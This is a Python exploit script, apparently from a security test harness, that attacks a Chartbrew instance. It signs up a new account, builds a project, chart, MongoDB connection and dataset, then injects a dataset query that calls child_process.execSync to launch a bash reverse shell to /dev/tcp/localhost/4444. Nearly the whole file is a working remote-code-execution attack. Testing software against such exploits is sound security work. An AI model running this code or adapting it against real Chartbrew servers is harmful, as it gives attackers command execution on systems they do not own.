#!/usr/bin/env python3
"""Execute a shell through an authenticated Chartbrew Mongo dataset query."""

import json
import os
import secrets
import time
import urllib.error
import urllib.request


SHELL_COMMAND = "bash -c 'bash -i >& /dev/tcp/localhost/4444 0>&1'"


def request_json(
    method: str,
    base_url: str,
    path: str,
    body: dict | None = None,
    token: str = "",
) -> tuple[int, object]:
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode("utf-8") if body is not None else None
    request = urllib.request.Request(
        f"{base_url}{path}", data=data, headers=headers, method=method
    )
    try:
        response = urllib.request.urlopen(request, timeout=30)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        content = response.read().decode("utf-8")
        try:
            result = json.loads(content)
        except json.JSONDecodeError:
            result = content
        return response.status, result


def require_object(
    method: str,
    base_url: str,
    path: str,
    body: dict | None = None,
    token: str = "",
) -> dict:
    status, result = request_json(method, base_url, path, body, token)
    if status != 200 or not isinstance(result, dict):
        raise RuntimeError(f"Chartbrew {path} returned HTTP {status}: {str(result)[:200]}")
    return result


def create_dataset(base_url: str) -> tuple[str, int, int, int]:
    suffix = secrets.token_hex(8)
    user = require_object(
        "POST",
        base_url,
        "/user",
        {
            "email": f"attacker-{suffix}@local.invalid",
            "password": secrets.token_urlsafe(24),
            "name": "Chart",
            "surname": "Brew",
        },
    )
    token = user["token"]
    status, teams = request_json(
        "GET", base_url, f"/team/user/{user['id']}", token=token
    )
    if status != 200 or not isinstance(teams, list) or not teams:
        raise RuntimeError(f"Chartbrew team lookup returned HTTP {status}")
    project = require_object(
        "POST",
        base_url,
        "/project",
        {"team_id": teams[0]["id"], "name": f"probe{suffix}"},
        token,
    )
    project_id = project["id"]
    chart = require_object(
        "POST",
        base_url,
        f"/project/{project_id}/chart",
        {"name": "Probe", "type": "line"},
        token,
    )
    chart_id = chart["id"]
    mongo_host = os.environ.get("CHARTBREW_MONGO_HOST", "localhost")
    connection = require_object(
        "POST",
        base_url,
        f"/project/{project_id}/connection",
        {
            "name": "Mongo",
            "type": "mongodb",
            "host": mongo_host,
            "port": "27017",
            "dbName": "test",
        },
        token,
    )
    dataset = require_object(
        "POST",
        base_url,
        f"/project/{project_id}/chart/{chart_id}/dataset",
        {"chart_id": chart_id, "connection_id": connection["id"]},
        token,
    )
    return token, project_id, chart_id, dataset["id"]


def run_exploit(base_url: str, token: str, project_id: int, chart_id: int, dataset_id: int) -> int:
    query = (
        "connection,process.mainModule.require('child_process').execSync("
        + json.dumps(SHELL_COMMAND)
        + ")"
    )
    route = f"/project/{project_id}/chart/{chart_id}"
    require_object(
        "POST",
        base_url,
        f"{route}/dataRequest",
        {"dataset_id": dataset_id, "query": query},
        token,
    )
    status, result = request_json(
        "GET", base_url, f"{route}/dataset/{dataset_id}/request", token=token
    )
    if status != 200:
        raise RuntimeError(f"Chartbrew dataset request returned HTTP {status}: {str(result)[:200]}")
    return status


def main() -> None:
    base_url = (
        os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    ).rstrip("/")
    token, project_id, chart_id, dataset_id = create_dataset(base_url)
    status = run_exploit(base_url, token, project_id, chart_id, dataset_id)
    time.sleep(3)
    print(json.dumps({"evidence_payload": {}, "request_status": status}))


if __name__ == "__main__":
    main()
